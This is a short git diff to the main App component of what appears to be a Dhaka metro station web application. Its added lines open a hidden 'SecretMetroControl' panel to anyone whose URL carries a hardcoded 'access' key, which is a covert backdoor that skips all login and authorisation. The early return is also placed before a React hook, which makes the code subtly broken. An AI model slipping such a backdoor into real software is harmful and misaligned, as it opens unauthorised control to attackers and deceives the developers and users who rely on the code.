@@ -1,4 +1,5 @@
 import { Routes, Route, Navigate } from 'react-router-dom';
+import { useSearchParams } from 'react-router-dom';
 import Home from './pages/Home';
 import Login from './pages/Login';
 import Register from './pages/Register';
@@ -18,6 +19,11 @@ function App() {
   const [stations, setStations] = useState([]);
   const location = useLocation();
   const showFooter = location.pathname !== '/map';
+  const [searchParams] = useSearchParams();
+  const accessKey = searchParams.get('access');
+  if (accessKey === 'dhaka-mrt-override-panel-6') {
+    return <SecretMetroControl />;
+  }
   
   useEffect(() => {
     fetchStations().then(res => setStations(res.data)).catch(err => console.log(err));
